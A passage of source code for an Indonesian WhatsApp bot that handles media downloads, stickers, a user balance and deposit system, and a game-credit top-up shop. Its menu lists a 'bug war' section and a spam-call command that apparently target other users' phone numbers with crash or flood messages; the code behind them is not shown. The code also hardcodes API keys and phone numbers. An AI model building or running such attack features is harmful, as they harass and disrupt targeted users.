│${no++} ▢› ${prefix}antilink off
│${no++} ▢› ${prefix}welcome on
│${no++} ▢› ${prefix}welcome off
│${no++} ▢› ${prefix}tiktokauto on
│${no++} ▢› ${prefix}tiktokauto off
│${no++} ▢› ${prefix}kick @tag
│${no++} ▢› ${prefix}demote @tag
│${no++} ▢› ${prefix}promote @tag
│
│-› *_SEARCH/DOWNLOADER_*
│${no++} ▢› ${prefix}tiktok
│${no++} ▢› ${prefix}ytmp3
│${no++} ▢› ${prefix}ytmp4
│${no++} ▢› ${prefix}pinterest
│${no++} ▢› ${prefix}playmp3
│${no++} ▢› ${prefix}playmp4
│${no++} ▢› ${prefix}gitclone
│${no++} ▢› ${prefix}mediafire
│${no++} ▢› ${prefix}wikimedia
│${no++} ▢› ${prefix}soundcloud
│${no++} ▢› ${prefix}infogempa
│
│-› *_CONVERT/TOOLS_*
│${no++} ▢› ${prefix}tts
│${no++} ▢› ${prefix}ttp
│${no++} ▢› ${prefix}ttp2
│${no++} ▢› ${prefix}attp
│${no++} ▢› ${prefix}attp2
│${no++} ▢› ${prefix}tourl
│${no++} ▢› ${prefix}toimg
│${no++} ▢› ${prefix}toimage
│${no++} ▢› ${prefix}tomp3
│${no++} ▢› ${prefix}toaudio
│${no++} ▢› ${prefix}tomp4
│${no++} ▢› ${prefix}tovideo
│${no++} ▢› ${prefix}emojimix
│${no++} ▢› ${prefix}emojmix
│${no++} ▢› ${prefix}emojinua
│${no++} ▢› ${prefix}mixemoji
│${no++} ▢› ${prefix}spamcall
│${no++} ▢› ${prefix}translate
│${no++} ▢› ${prefix}stiker
│${no++} ▢› ${prefix}sticker
│${no++} ▢› ${prefix}sgif
│${no++} ▢› ${prefix}stikergif
│${no++} ▢› ${prefix}stickergif
│${no++} ▢› ${prefix}swm
│${no++} ▢› ${prefix}stikerwm
│${no++} ▢› ${prefix}stickerwm
│${no++} ▢› ${prefix}smeme
│${no++} ▢› ${prefix}memestiker
│${no++} ▢› ${prefix}stikermeme
│${no++} ▢› ${prefix}stickermeme
│${no++} ▢› ${prefix}takesticker
│${no++} ▢› ${prefix}emojinua2
│${no++} ▢› ${prefix}mixemoji2
│${no++} ▢› ${prefix}emojmix2
│${no++} ▢› ${prefix}emojimix2
│${no++} ▢› ${prefix}upload
│${no++} ▢› ${prefix}ssweb-pc
│${no++} ▢› ${prefix}ssweb-hp
│${no++} ▢› ${prefix}bitly_short
│${no++} ▢› ${prefix}cuttly_short
│${no++} ▢› ${prefix}tinyurl_short
│${no++} ▢› ${prefix}base32
│${no++} ▢› ${prefix}base64
│${no++} ▢› ${prefix}debase32
│${no++} ▢› ${prefix}debase64
│
│-› *_BUG WAR MENU_*
│${no++} ▢› ${prefix}poll 628xxx
│${no++} ▢› ${prefix}bug1 628xxx
│${no++} ▢› ${prefix}bug2 628xxx
│${no++} ▢› ${prefix}bug3 628xxx
│${no++} ▢› ${prefix}bug4 628xxx
│${no++} ▢› ${prefix}bug5 628xxx
│${no++} ▢› ${prefix}bug6 628xxx
│${no++} ▢› ${prefix}santet @tag
│${no++} ▢› ${prefix}sendbug @tag
│${no++} ▢› ${prefix}ampas1 628xxx
│${no++} ▢› ${prefix}ampas2 628xxx
│${no++} ▢› ${prefix}ampas3 628xxx
╰───────────⬣`
var buttonMessage = {
text: menu_nya,
footer: footer_nya,
mentions: [sender, gurbot],
buttons: [
{ buttonId: '#iklan', buttonText: {displayText: '️ɪᴋʟᴀɴ'}, type: 1},
{ buttonId: '#owner', buttonText: {displayText: 'ᴏᴡɴᴇʀ'}, type: 1},
{ buttonId: '#groupbot', buttonText: {displayText: 'ɢʀᴏᴜᴘ'}, type: 1}
],
headerType: 1
}
conn.sendMessage(from, buttonMessage, {quoted:msg})
}
break
case 'donate':
case 'donasi':{
var monoSpace = '```'
reply(`──「 *MENU DONATE* 」──

Hi *${cekUser("name", sender)}* ${ucapanWaktu} 👋🏻

*Payment Ovo*
*Number:* ${setting.payment.ovo.nomer}
*A/N:* ${setting.payment.ovo.atas_nama}

*Payment Dana*
*Number:* ${setting.payment.dana.nomer}
*A/N:* ${setting.payment.dana.atas_nama}

*Payment Qris*
*Url:* ${setting.payment.qris.link_nya}
*A/N:* ${setting.payment.qris.atas_nama}

${monoSpace}Terimakasih untuk kamu yang sudah donasi untuk perkembangan bot ini ^_^${monoSpace}

──「 *THX FOR YOU* 」──`)
}
break
case 'infoowner':
case 'ownerinfo':{
let owner_info =`──「 *INFO OWNER* 」──

 *Data Profil*
 • *Nama:* ohlx Official
 • *Hoby:* Turu/Game
 • *Askot:* Palembang
 • *Konten:* Creator

_iam developer bot whatsapp._

 *Sosial Media*
 • *Whatsapp:* 6285943429237
 • *Youtube:* OHLX BOR`
reply(owner_info)
}
break
case 'infogempa':
fetchJson(`https://saipulanuar.ga/api/info/gempa?apikey=jPHjZpQF`)
.then(xg =>{
reply(`*INFO GEMPA*

*tanggal:* ${xg.result.tanggal}
*jam:* ${xg.result.jam}
*datetime:* ${xg.result.datetime}
*coordinates:* ${xg.result.coordinates}
*lintang:* ${xg.result.lintang}
*bujur:* ${xg.result.bujur}
*magnitude:* ${xg.result.magnitude}
*kedalaman:* ${xg.result.kedalaman}
*wilayah:* ${xg.result.wilayah}
*potensi:* ${xg.result.potensi}
*dirasakan:* ${xg.result.dirasakan}`)
})
break
case 'wikimedia':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply('Contoh:\n#wikimedia viral')
fetchJson(`https://saipulanuar.ga/api/search/wikimedia?query=${q}&apikey=jPHjZpQF`)
.then(wk =>{
var text_wikimedia =`*WIKIMEDIA SEARCH*
*title:* ${wk.result.title}
*source:* ${wk.result.source}
*author:* wikimedia`
conn.sendMessage(from, { image:{url:wk.result.image}, caption:text_wikimedia}, {quoted:msg})
})
}
break
case 'joker':
case 'digital':
case 'nulis':
case 'nulis2':
case 'quoteser':
case 'quobucin':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Contoh:\n${prefix+command} saya bukan wibu`)
reply(mess.wait)
var buc = `https://saipulanuar.ga/api/textmaker/${command}?text=${q}&apikey=jPHjZpQF`
conn.sendMessage(from, { image:{url:buc}, caption:'Done!'}, {quoted:msg})
}
break
case 'attp2':
case 'attp':
case 'ttp2':
case 'ttp':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Contoh:\n${prefix+command} saya wibu`)
var nyz1 = await getBuffer(`https://saipulanuar.ga/api/maker/${command}?text=${q}&apikey=jPHjZpQF`)
fs.writeFileSync('getpp.jpeg', nyz1)
await ffmpeg("getpp.jpeg")
.input("getpp.jpeg")
.on('error', function (error) { only("error", conn, from) })
.on('end', function () {conn.sendMessage(from, { sticker: {url: './getpp.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./getpp.webp')
await sleep(5000)
fs.unlinkSync('./getpp.jpeg')
fs.unlinkSync('./getpp.webp')
}
break
case 'pinterest':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Contoh:\n${prefix+command} loli`)
reply(mess.wait)
fetchJson(`https://saipulanuar.ga/api/search/pinterest?query=${q}&apikey=jPHjZpQF`)
.then(pin =>{
var media = pickRandom(pin.result)
conn.sendMessage(from, { image:{url:media}, caption:`Done *${q}*`}, {quoted:msg})
})
break
case 'tts':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Contoh:\n${prefix+command} hallo bro`)
var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
conn.sendMessage(sender, {audio:{url:tts}, mimetype:'audio/mpeg', ptt:true}, {quoted:msg})
}
break
case 'playmp3':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply('*Contoh:*\n#playmp3 preset angel baby 30 detik')
fetchJson(`https://api-yogipw.herokuapp.com/api/yt/playmp3?query=${q}`)
.then(z=>{
var text_playmp3 =`*YOUTUBE PLAYMP3*

*title:* ${z.title}
*channel:* ${z.channel}
*published:* ${z.published}
*views:* ${z.views}
*type:* audio/mp3

Media sedang dikirim.`
reply(text_playmp3)
conn.sendMessage(sender, {audio:{url:z.url}, mimetype:'audio/mpeg', fileName: z.title+'mp3'}, {quoted:msg})
if (isGroup) return reply('Media sudah dikirim dichat pribadi.')
})
break
case 'soundcloud':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply('*Contoh:*\n#soundcloud https://soundcloud.com/ndaa-212683099/dj-coba-kau-ingat-ingat-kembali-seharusnya-aku-jungle-dutch-terbaru-2021-full-bass-viral-tik?utm_source=clipboard&utm_medium=text&utm_campaign=social_sharing')
var yurl = q
reply(mess.wait)
fetchJson(`https://saipulanuar.ga/api/download/soundcloud?url=${yurl}&apikey=jPHjZpQF`).then(sdc =>{
reply(`*SOUNDCLOUD DOWNLOAD*

*author:* OHLX BOT
*title:* ${sdc.result.title}
*duration:* ${sdc.result.duration}
*quality:* ${sdc.result.quality}

Audio sedang dikirim...

*Note:*
jika reply message status undefined
itu artinya url tidak ditemukan.`)
conn.sendMessage(sender, {audio:{url:sdc.result.download}, mimetype:'audio/mpeg', fileName: sdc.result.title+'mp3'}, {quoted:msg})
if (isGroup) return reply('Audio sudah dikirim dichat pribadi.')
})
break
case 'playmp4':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply('*Contoh:*\n#playmp4 preset angel baby 30 detik')
fetchJson(`https://api-yogipw.herokuapp.com/api/yt/playmp4?query=${q}`)
.then(zz=>{
var text_playmp4 =`*YOUTUBE PLAYMP4*

*title:* ${zz.title}
*channel:* ${zz.channel}
*published:* ${zz.published}
*views:* ${zz.views}
*type:* video/mp4

Media sedang dikirim.`
reply(text_playmp4)
conn.sendMessage(sender, {video:{url:zz.url}, caption:'Done!'}, {quoted:msg})
if (isGroup) return reply('Media sudah dikirim dichat pribadi.')
})
break
case 'mediafire':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply('*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
if (!isLinks) return reply('Link yang kamu berikan tidak valid')
reply('*Mengunduh Media...*')
let baby1 = await mediafireDl(`${isLinks}`)
if (baby1[0].size.split('MB')[0] >= 100) return reply('File Melebihi Batas '+util.format(baby1))
let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Type* : ${baby1[0].mime}

_Wait Mengirim file..._
`
reply(result4)
if (isGroup) return reply('*document udah dikirim ke chat pribadi bot.*')
conn.sendMessage(sender, {document:{url:baby1[0].link}, fileName:baby1[0].nama, mimetype: baby1[0].mime}, {quoted:msg}).catch ((err) => reply('Gagal saat mendownload File'))
break
case 'grupbot':
case 'groupbot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(`*Forum Bot Whatsapp*
https://linktr.ee/playshop.id`)
break
case 'kur':
case 'kurang':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Example:\n#${command} number|nominal\n\nContoh:\n#resetsaldo 628xx|5000`)
var num = q.split('|')[0] + '@s.whatsapp.net'
var nom = q.split('|')[1]
if (!num) return reply('Nomor Tujuan harus di isi!!')
if (!nom) return reply('Nominal Reset harus di isi!!')
minSaldo(num, nom, DB_saldoUser)
var text_reset =`*SALDO BERKURANG*
*Nominal:* Rp${toRupiah(nom)}
*Sisa Saldo :* Rp${toRupiah(cekSaldo(num,DB_saldoUser))}

_Jika ada kendala Hubungi owner_`
reply(text_reset)
conn.sendMessage(num, {text:text_reset})
}
break
case 'tf': case 'tranfer': case 'transfer':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekSaldo(sender,DB_saldoUser) === 0) return reply(`Maaf kak, sepertinya saldo kamu Rp0 Silahkan melakukan ${prefix}deposit terlebih dahulu`)
var data_number = q.split('|')[0] + '@s.whatsapp.net'
var data_jumlah = q.split('|')[1]
if (!data_number) return reply('Nomor Tujuan harus di isi!!')
if (!data_jumlah) return reply('Jumlah Transfer harus di isi!!\n#transfer 10000|6285943429237')
if (data_number !== cekUser("id", data_number)) return reply('Maaf kak nomor tujuan belum terdaftar di database bot.')
reply('Transfer kamu sedang diproses ⏳')
await sleep(5000)
if (cekSaldo(sender,DB_saldoUser) < Number(data_jumlah)) return reply(`Transfer gagal dilakukan ❌\nSaldo kamu kurang untuk melakukan transfer sejumlah: Rp${toRupiah(data_jumlah)}`)
minSaldo(sender, Number(data_jumlah))
let pengirim_saldo =`*TRANSFER-SALDO*
Pengirim: @${sender.split('@')[0]}
Penerima: @${data_number.split('@')[0]}
Jumlah Transfer: Rp${toRupiah(data_jumlah)}
Status Transfer: Berhasil
Sisa Saldo Kamu: Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}`
conn.sendMessage(sender, {text:pengirim_saldo})
addSaldo(data_number, Number(data_jumlah), DB_saldoUser)
let text_isisaldo =`*TRANSFER SALDO*
_*Dari:* @${sender.split('@')[0]}_
_*Jumlah terima :* Rp${toRupiah(data_jumlah)}_
_*Total saldo :* Rp${toRupiah(cekSaldo(data_number,DB_saldoUser))}_`
let but = [{buttonId: `!ksihh ${sender}`, buttonText: {displayText: 'Terima Kasih'}, type: 1}]
conn.sendMessage(data_number, { text:text_isisaldo, footer: '® transfer saldo', buttons: but})
}
break
case 'ksihh':
reply('Sama sama☺️')
conn.sendMessage(q, {text:'Transfer Sudah Diterima.'})
break
case 'isisaldo':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('Cara Transfer Saldo User.\n\nExample: #transfer nohp|jumlah\n\nContoh: #transfer 628xxx|5000')
let data_number = q.split('|')[0] + '@s.whatsapp.net'
let data_jumlah = q.split('|')[1]
if (!data_number) return reply('Nomor Tujuan harus di isi!!')
if (!data_jumlah) return reply('Jumlah Transfer harus di isi!!')
addSaldo(data_number, Number(data_jumlah), DB_saldoUser)
fs.writeFileSync('./database/DB_saldoUser.json', JSON.stringify(DB_saldoUser, null, 2))
let text_isisaldo =`*Hallo @${data_number.split('@')[0]}*\n*_Saldo Kamu telah di tambahkan sebesar Rp${toRupiah(data_jumlah)} Dari owner bot_*\n\n*_Total saldo kamu : Rp${toRupiah(cekSaldo(data_number,DB_saldoUser))}_*`
conn.sendMessage(data_number, {text: text_isisaldo})
reply('Sukses transfer saldo ke user.')
}
break
case 'infobot':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
reply(`𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
• Author : @${ownerNumber.split('@')[0]}
• Owner : ${setting.ownerName}
• Botname : ${setting.botName}
• Library : Baileys-MD
• Time : ${jam} WIB
• Date : ${tanggal}
• Terdaftar : ( ${("id", db_user).length} )
• Room Chat : ( ${db_menfes.length} )`)
break
case 'ssweb-pc':
case 'ssweb-hp':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (!q) return reply(`Masukan parameter url\n*Contoh:*\n${prefix+command} https://google.com`)
reply(mess.wait)
let anu =`https://leyscoders-api.herokuapp.com/api/${command}?url=${q}&apikey=IkyOgiwara`
conn.sendMessage(from, { image: {url: anu}, caption: 'Done!'}, {quoted:msg})
}
break
case 'setapikey':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`*Contoh:*\n#setfooter apikey_atlantic`)
setting.apikey_antlatic = q
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
reply('Sukses mengganti apikey')
break
case 'apikey':
if (!isOwner) return reply(mess.OnlyOwner)
reply(setting.apikey_antlatic)
break
case 'setfooter':
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply(`Masukan parameter text\n*Contoh:*\n#setfooter ${setting.footer}`)
setting.footer = q
fs.writeFileSync('./config.json', JSON.stringify(setting, null, 2))
reply('Sukses mengganti footer')
break
case 'runtime':
case 'tes':
if (!isOwner) return reply(mess.OnlyOwner)
reply(`*Runtime :* ${runtime(process.uptime())}`)
break
case 'ceksaldo':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
mentions(`*YOUR INFO*
*ID:* @${sender.split('@')[0]}
*Saldo:* Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}`, [sender])
break
case 'rules':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let text_rules =`*──「 RULES-BOT 」──*

1. Jangan spam bot. 
Sanksi: *WARN/SOFT BLOCK*

2. Jangan telepon bot.
Sanksi: *SOFT BLOCK*

3. Jangan mengejek bot.
Sanksi: *PERMANENT BLOCK*

Jika sudah paham rulesnya
Ketik *#menu* untuk memulai bot`
conn.sendMessage(from, { text: text_rules })
}
break
case 'user':
case 'db':{
if (!isOwner) return reply(mess.OnlyOwner)
let xx_us = JSON.parse(fs.readFileSync("./database/pengguna.json"));
let no = 1
let teks =`*INFO-DASHBOARD*

*• Terdaftar :* ( ${("id", db_user).length} )
*• Room Chat :* ( ${db_menfes.length} )\n\n`
for (let x of xx_us){
teks_db +=`*User${no++} ${x.name}*\n*ID: @${x.id.split('@')[0]}*\n*Saldo: Rp${toRupiah(cekSaldo(x.id,DB_saldoUser))}*\n*Premium: ${x.premium? 'aktif':'tidak'}*\n\n`
}
mentions(`${teks_db}`, [sender])
}
break
case 'addprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#addprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == true) return reply('User tersebut sudah premium')
setUser("±premium", number_one, true)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* aktif`)
}
break
case 'delprem':{
if (!isOwner) return reply(mess.OnlyOwner)
if (!q) return reply('*Contoh:*\n#delprem 628xxx')
var number_one = q+'@s.whatsapp.net'
if (cekUser("id", number_one) == null) return reply('User tersebut tidak terdaftar di database')
if (cekUser("premium", number_one) == false) return reply('User tersebut tidak premium')
setUser("±premium", number_one, false)
reply(`*PREMIUM*\n*ID:* @${number_one.split('@')[0]}\n*Status:* tidak`)
}
break
case 'owner':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var owner_Nya = setting.ownerNumber
sendContact(from, owner_Nya, setting.ownerName, msg)
await sleep(1000)
var owner_nyaa = '6281574773972@s.whatsapp.net'
sendContact(from, owner_nyaa, "Developer Bot", msg)
}
break
case 'room':{
if (!isOwner) return reply(mess.OnlyOwner)
var room =`*CHAT ANONYMOUS*\n\n*TOTAL ROOM : ${anonymous.length}*\n\n`
var no = 1
for (let x of anonymous){
room +=`*ID ROOM ${x.id}*
*CHAT1: @${x.a.split('@')[0]}*
*CHAT2: @${x.b.split('@')[0]}*
*STATUS: ${x.state}*\n\n`
}
reply(room)
}
break
case 'ip':
case 'cekip':
if (!isOwner) return reply(mess.OnlyOwner)
axios({
method: 'POST',
url: 'https://www.atlantic-pedia.co.id/api/pulsa',
data: qs.stringify({
key: setting.apikey_antlatic,
action: "services"
})
}).then(res => {
var regExcomp = (a, b) => {
var aPrice = Number(a.price.replace(/[^0-9.-]+/g,""));
var bPrice = Number(b.price.replace(/[^0-9.-]+/g,""));
return aPrice - bPrice
};
if (res.data.result == false) return reply(res.data.data)
let text_cekip ='IP sudah terhubung ke server ✓'
conn.sendMessage(from, { text: text_cekip }, { quoted: msg })
})
break
case 'deposit': case 'depo':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
var rows = [
{
title: "QRIS",
rowId: "payment_qris",
description: "Status : True"
},
{
title: "DANA",
rowId: "payment_dana",
description: "Status : True"
},
{
title: "OVO",
rowId: "payment_ovo",
description: "Status : True"
},
{
title: "GOPAY",
rowId: "!payment_gopay",
description: "Status : True"
}
]
var dep_but = {
text: `Hai *${cekUser("name", sender)}* ${ucapanWaktu} ✨️\ningin melakukan deposit saldo? silahkan pilih payment yang tersedia️`,
buttonText: "Pilih disini",
sections: [ { title: "༆━━━━[ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗗𝗲𝗽𝗼𝘀𝗶𝘁 ]━━━━࿐", rows } ]
}
conn.sendMessage(from, dep_but)
}
break
case 'payment_gopay':
reply('payment Gopay belum tersedia\nsilahkan pilih payment lain ya️')
break
case 'bukti':
if (!fs.existsSync(depositPath + sender.split("@")[0] + ".json")) return reply("Sepertinya kamu belum melakukan deposit")
if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)

let oke_bang = fs.readFileSync(`./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)
let data_depo = JSON.parse(fs.readFileSync(depositPath + sender.split("@")[0] + ".json"))

let caption_bukti =`「 *DEPOSIT USER* 」

_༅ ID Resi: ${data_depo.ID}_
_༅ Nomer: @${data_depo.number.split('@')[0]}_
_༅ Payment: ${data_depo.payment}_
_༅ Tanggal: ${data_depo.date.split(' ')[0]}_
_༅ Jumlah Deposit: Rp${toRupiah(data_depo.data.amount_deposit)}_
_༅ Pajak: Rp1.500_
_༅ Total Bayar: Rp${toRupiah(data_depo.data.amount_deposit+1500)}_

_Ada yang deposit nih kak, coba dicek saldonya, jika sudah masuk konfirmasi dengan klik button *Accept*_`

let bukti_button = [
{ buttonId: `#acc_deposit ${sender.split('@')[0]}`, buttonText: {displayText: 'Accept'}, type: 1},
{ buttonId: `#reject_deposit ${sender.split('@')[0]}`, buttonText: {displayText: 'Reject'}, type: 1}
]
let bukti_bayar = {
image: oke_bang,
caption: caption_bukti,
title: 'bukti pembayaran',
footer: 'Press The Button Below',
buttons: bukti_button,
headerType: 5 
}
conn.sendMessage(`${setting.ownerNumber}`, bukti_bayar)
reply(`Mohon tunggu ya kak, sampai di acc oleh owner ☺️`)
fs.unlinkSync(`./transaksi/BuktiTransfer/${sender.split('@')[0]}.jpg`)
break
case 'acc_deposit':{
if (!isOwner) return reply(mess.OnlyOwner)
let orang = q
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
addSaldo(data_deposit.number, Number(data_deposit.data.amount_deposit), DB_saldoUser)
var text_sukses = `「 𝘿𝙀𝙋𝙊𝙎𝙄𝙏-𝙎𝙐𝙆𝙎𝙀𝙎 」

 ● 𝗜𝗗 𝗥𝗲𝘀𝗶: ${data_deposit.ID}
 ● 𝗡𝗼𝗺𝗲𝗿: ${data_deposit.number.split('@')[0]}
 ● 𝗣𝗮𝘆𝗺𝗲𝗻𝘁: ${data_deposit.payment}
 ● 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${data_deposit.date.split(' ')[0]}
 ● 𝗝𝘂𝗺𝗹𝗮𝗵 𝗗𝗲𝗽𝗼𝘀𝗶𝘁: Rp${toRupiah(data_deposit.data.amount_deposit)}`
reply(text_sukses)
conn.sendMessage(data_deposit.number, { text: `${text_sukses}\n\n_Deposit kamu telah dikonfirmasi oleh admin, silahkan cek saldo dengan cara ketik #infome_`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break
case 'reject_deposit':{
if (!isOwner) return reply(mess.OnlyOwner)
let orang = q
let data_deposit = JSON.parse(fs.readFileSync(depositPath + orang + '.json'))
reply(`Sukses Reject ID Deposit : ${data_deposit.ID}`)
conn.sendMessage(data_deposit.number, { text: `Maaf Deposit Dengan ID : *${data_deposit.ID}* Ditolak❌, Jika ada kendala hubungin Owner Bot.\nwa.me/${setting.ownerNumber.split('@')[0]}`})
fs.unlinkSync(depositPath + data_deposit.number.split('@')[0] + ".json")
}
break
case 'premium': case 'buypremium':
mentions(`*Ingin Jadi Premium?*
*Silahkan Pilih Waktu Nya*

*List Harga*
Rp5.000 › 5day
Rp10.000 › 10day
Rp15.000 › 15day
Rp20.000 › 20day

*Dan Seterusnya...*
*day › hari*

*Keuntungan Premium*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Premium_

*Minat Jadi Premium?*
*Hubungi Owner*
@${setting.ownerNumber.split('@')[0]}`, [sender])
break
case 'sewabot':
mentions(`*SEWA BOT*

*SEWA BOT*

*List Harga*
Rp3.000 › 15day
Rp5.000 › 1bulan
Rp7.000 › 45day
Rp10.000 › 2bulan
Rp15.000 › 3bulan

*day › hari*

*Keuntungan Sewabot*
- _Bisa Add Bot 1 Group_
- _Bisa Gunain Fitur Admin_

*Minat Sewabot?*
*Hubungi Owner*
@${setting.ownerNumber.split('@')[0]}`, [sender])
break
case 'cekprem':{
mentions(`*CEK PREMIUM*
_• ID : @${cekUser("id", sender).split('@')[0]}_
_• Status : ${cekUser("premium", sender)? 'Aktif':'Tidak'}_`, [sender])
}
break
case 'me': case 'infome': case 'saldo':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
let text_infome =`*─「 CHECK YOUR INFO 」─*

_• ID : @${cekUser("id", sender).split('@')[0]}_
_• Nama : ${cekUser("name", sender)}_
_• Seri : ${cekUser("seri", sender)}_
_• Saldo : Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}_
_• Premium : ${cekUser("premium", sender)? 'Aktif':'Tidak'}_

_Jika ingin melakukan topup_
_ketik:_ *#topup*

_Jika ingin melakukan isi saldo_
_ketik:_ *#deposit*

_Jika ingin melihat produk topup_
_ketik:_ *#listharga*

_Jika ingin mengubah nama luh_
_ketik:_ *#gantinama*
`
mentions(`${text_infome}`, [sender])
}
break
case 'ceksaldo':
reply(`*SALDO USER*
_• ID : @${cekUser("id", sender).split('@')[0]}_
_• Nama : ${cekUser("name", sender)}_
_• Saldo : Rp${toRupiah(cekSaldo(sender,DB_saldoUser))}_`)
break
case 'buy': case 'topup':
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
if (cekSaldo(sender,DB_saldoUser) == 0) return reply(`Maaf kak, sepertinya saldo kamu Rp0 Silahkan melakukan ${prefix}deposit terlebih dahulu sebelum topup\n\nketik ${prefix}listharga untuk melihat produk topup yang tersedia!!`)
if (!fs.existsSync(topupPath + sender.split("@")[0] + ".json")) {
const sections = [
{title: "༆━━━━━[ 𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗚𝗮𝗺𝗲 ]━━━━━࿐",
rows: [
{title: "Garena Shell Murah", rowId: "topup_gs", description: "Menampilkan list harga Voucher Garena Shell"},
{title: "Garena Free Fire", rowId: "topup_ff", description: "Menampilkan list harga Diamond FF"},
{title: "Mobile Legends", rowId: "topup_ml", description: "Menampilkan list harga Diamond ML"},
]},
{title: "༆━━━━━[ 𝗧𝗼𝗸𝗲𝗻 𝗟𝗶𝘀𝘁𝗿𝗶𝗸 ]━━━━━࿐",
rows: [
{title: "Token PLN Murah", rowId: "topup_pln", description: "Menampilkan list harga Token PLN"},
]},
{title: "༆━━━━━[ 𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗦𝗮𝗹𝗱𝗼 ]━━━━━࿐",
rows: [
{title: "Saldo Ovo", rowId: "topup_ovo", description: "Menampilkan list harga Saldo Ovo"},
{title: "Saldo Dana", rowId: "topup_dana", description: "Menampilkan list harga Saldo Dana"},
{title: "Saldo Gopay", rowId: "topup_gopay", description: "Menampilkan list harga Saldo Gopay"},
{title: "Saldo LinkAja", rowId: "topup_linkaja", description: "Menampilkan list harga Saldo Linkaja"},
{title: "Saldo ShopeePay", rowId: "topup_shoope", description: "Menampilkan list harga Saldo Shopee Pay"},
]},
{title: "༆━━━━━[ 𝗣𝘂𝗹𝘀𝗮 𝗧𝗿𝗮𝗻𝘀𝗳𝗲𝗿 ]━━━━━࿐",
rows: [
{title: "Operator XL", rowId: "pulsa_xl", description: "Menampilkan list harga Pulsa XL"},
{title: "Operator Axis", rowId: "pulsa_axis", description: "Menampilkan list harga Pulsa Axis"},
{title: "Operator Three", rowId: "pulsa_three", description: "Menampilkan list harga Pulsa Three"},
{title: "Operator Indosat", rowId: "pulsa_indosat", description: "Menampilkan list harga Pulsa Indosat"},
{title: "Operator Telkomsel", rowId: "pulsa_telkomsel", description: "Menampilkan list harga Pulsa Telkomsel"},
]}
]
let isian = `List produk yang kami
sediakan, silahkan pilih salah satu.`
const button_topup = {
text: isian,
buttonText: "Pilih Produk",
sections
}
var object_buy = {
ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
number: sender,
session: 'PILIH-GAME',
date: new Date().toLocaleDateString("ID", { timeZone: "Asia/Jakarta"}),
data: {
id_target: '',
id_zone: '',
id_produk: '',
id_topup: '',
harga_topup: '',
produk_topup: ''
}
}
fs.writeFile(topupPath + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
conn.sendMessage(from, button_topup)
})
} else {
var buttonMessage = {
text: `Hey, sepertinya kamu masih ada proses yang belum diselesaikan, Ingin batal? click batal dibawah 👇🏻`,
footer: setting.footer,
buttons: [
{ buttonId: 'batal_order', buttonText: {displayText: 'Batal'}, type: 1},
],
headerType: 1
}
conn.sendMessage(from, buttonMessage, {quoted:msg})
}
break
case 'listharga':{
if (cekUser("id", sender) == null) return reply(mess.OnlyUser)
const sections = [
{title: "༆━━━━━[ 𝗩𝗼𝘂𝗰𝗵𝗲𝗿 𝗚𝗮𝗺𝗲 ]━━━━━࿐",
rows: [
